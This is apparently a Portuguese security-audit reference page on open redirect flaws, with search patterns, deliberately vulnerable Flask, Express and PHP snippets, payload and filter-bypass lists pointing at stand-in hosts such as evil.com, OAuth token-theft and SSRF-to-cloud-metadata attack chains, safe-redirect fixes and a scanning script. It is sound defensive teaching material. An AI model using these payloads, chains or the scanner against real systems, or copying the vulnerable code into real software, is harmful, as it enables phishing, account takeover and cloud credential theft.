# Open Redirect

**Tags:** #baixo #medio #open-redirect #phishing #oauth #ssrf
**OWASP:** A01:2021  Broken Access Control
**CVSS Base:** 3.1 (Baixo isolado)  8.1 (Alto em chain com OAuth/SSRF)

---

## 📖 O que é

Open Redirect ocorre quando um endpoint aceita uma URL como parâmetro e redireciona o usuário para ela sem validação. Sozinho tem impacto baixo (phishing). Em chain com OAuth ou SSRF, torna-se crítico.

---

## 🔍 `grep_search` Táticas

```
redirect(req.query
header("Location:", $_GET
res.redirect(req.query
res.redirect(req.body
window.location = searchParams
location.href = params
return redirect(
next=
returnUrl=
redirectTo=
callback=
url=
redirect_uri=
```

---

## 💣 Exemplos de Código Vulnerável

```python
#  VULNERÁVEL  Flask
@app.get('/login')
def login():
    next_url = request.args.get('next', '/')
    # Após login, redireciona sem validar
    return redirect(next_url)  # redirect para qualquer URL!
```

```javascript
//  VULNERÁVEL  Express
app.get('/logout', (req, res) => {
    req.session.destroy();
    const returnUrl = req.query.returnUrl || '/';
    res.redirect(returnUrl);  // redireciona sem validar!
});
```

```php
//  VULNERÁVEL  PHP
$redirect = $_GET['redirect'];
header("Location: " . $redirect);
exit;
```

---

## 💣 Payloads de Open Redirect

### Diretos
```
https://target.com/login?next=https://evil.com
https://target.com/logout?returnUrl=https://phishing.com
https://target.com/redirect?url=//evil.com
https://target.com/out?to=https://attacker.com
```

### Bypass de Filtros Simples

```
# Double slash
//evil.com
//evil.com/path

# Protocol-relative URL
//attacker.com

# Encoded
%2F%2Fevil.com
%68ttps://evil.com   (h encodado)

# @ character (user info no URL)
https://trusted.com@evil.com/
https://evil.com%09@trusted.com/

# Fragmento
https://trusted.com#https://evil.com

# Subdomínio do atacante que parece domínio confiável
https://trusted.com.evil.com/
https://evil.com/?next=trusted.com

# JavaScript scheme
javascript:alert(1)
javascript:location.href='https://evil.com'
```

---

## 🔗 Open Redirect em Chains Críticas

### Chain 1: Open Redirect + OAuth  Token Theft

```
Pré-condição: OAuth app usa trusted.com no redirect_uri

1. Atacante descobre Open Redirect em trusted.com:
   https://trusted.com/redir?next=https://evil.com

2. Registra redirect_uri como:
   https://trusted.com/redir?next=https://evil.com

3. URL de autorização OAuth:
   https://oauth-provider.com/auth?
     client_id=xxx&
     redirect_uri=https://trusted.com/redir?next=https://evil.com&
     response_type=code&
     scope=openid

4. Vítima autoriza  código redirected para trusted.com
5. trusted.com redireciona para evil.com com o ?code=AUTHORIZATION_CODE
6. Atacante usa o código para obter access_token da vítima = Account Takeover
```

**Reclassificação:** Open Redirect 🔵 Baixo  com OAuth = 🔴 Crítico

---

### Chain 2: Open Redirect + SSRF  Bypass de Whitelist

```
Pré-condição: SSRF endpoint valida apenas whitelist de domínios

1. SSRF endpoint aceita: https://trusted-api.com/...
2. Open Redirect em trusted-api.com/redir?to=http://169.254.169.254/

3. SSRF payload:
   {"url": "https://trusted-api.com/redir?to=http://169.254.169.254/"}
   
4. Servidor valida: domínio = trusted-api.com 
5. Servidor faz GET  trusted-api.com redireciona para 169.254.169.254
6. Credenciais IAM AWS obtidas
```

---

## 🛡️ Correção

```python
#  CORRETO  validar que a URL é relativa ou domínio permitido
from urllib.parse import urlparse, urljoin

ALLOWED_HOSTS = {'myapp.com', 'www.myapp.com'}

def safe_redirect(url, fallback='/'):
    """Redireciona apenas para URLs seguras do próprio domínio."""
    if not url:
        return fallback
    
    # URL relativa é segura
    if url.startswith('/') and not url.startswith('//'):
        return url
    
    parsed = urlparse(url)
    if parsed.netloc in ALLOWED_HOSTS:
        return url
    
    return fallback  # URL externa  fallback seguro

@app.get('/login')
def login():
    next_url = safe_redirect(request.args.get('next'))
    return redirect(next_url)
```

```javascript
//  CORRETO  Express com validação de URL relativa
function safeRedirect(url, req, res, fallback = '/') {
    if (!url) return res.redirect(fallback);
    
    // Apenas URLs relativas (começam com / mas não com //)
    if (url.startsWith('/') && !url.startsWith('//')) {
        return res.redirect(url);
    }
    
    // Ou domínios explicitamente permitidos
    const parsed = new URL(url, `${req.protocol}://${req.hostname}`);
    const ALLOWED = new Set(['myapp.com', 'www.myapp.com']);
    
    if (ALLOWED.has(parsed.hostname)) {
        return res.redirect(url);
    }
    
    return res.redirect(fallback);
}
```

---

## 🧪 Script de Validação

```python
# .tmp/validate_open_redirect.py
import requests

TARGET = "http://target.com"
REDIRECT_ENDPOINTS = [
    "/login",
    "/logout",
    "/redirect",
    "/out",
    "/go",
]
PARAMS = ["next", "url", "redirect", "returnUrl", "to", "goto", "return"]
ATTACKER = "https://attacker.com"

for endpoint in REDIRECT_ENDPOINTS:
    for param in PARAMS:
        payload_url = f"{TARGET}{endpoint}?{param}={ATTACKER}"
        r = requests.get(payload_url, allow_redirects=False, timeout=5)
        
        location = r.headers.get('Location', '')
        if ATTACKER in location:
            print(f"[🔴 VULN] Open Redirect: {payload_url}")
            print(f"  Location: {location}")
        elif r.status_code in [301, 302, 303, 307, 308]:
            print(f"[redirect] {payload_url}  {location[:100]}")
```

---

## 📌 Referências
- [[ssrf-server-side-request-forgery]]
- [[oauth-2.0-saml-ataques-de-protocolo]]
- [[chain-exploit-efeito-borboleta]]
- [PortSwigger Open Redirect](https://portswigger.net/web-security/dom-based/open-redirection)
